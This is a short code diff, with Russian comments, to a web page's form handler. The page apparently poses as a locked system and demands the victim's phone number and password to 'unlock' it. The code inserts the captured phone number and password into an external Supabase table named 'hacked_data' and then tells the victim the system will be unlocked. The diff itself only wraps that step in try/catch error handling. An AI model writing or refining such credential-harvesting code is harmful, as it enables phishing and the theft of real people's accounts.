@@ -102,18 +102,21 @@
                 return;
             }
             
-            // Отправляем данные в Supabase
-            const { data, error } = await supabase
-                .from('hacked_data')
-                .insert([{ phone, password }]);
-            
-            if (error) {
-                console.error('Ошибка:', error);
-                alert('Ошибка отправки!');
-            } else {
+            try {
+                // Отправляем данные в Supabase
+                const { data, error } = await supabase
+                    .from('hacked_data')
+                    .insert([{ phone, password }]);
+                
+                if (error) throw error;
+                
                 alert('Данные приняты! Система будет разблокирована...');
                 document.getElementById('modal').style.display = 'none';
                 document.getElementById('overlay').style.display = 'none';
+                
+            } catch (error) {
+                console.error('Ошибка:', error);
+                alert('Ошибка отправки данных!');
             }
         });
     </script>
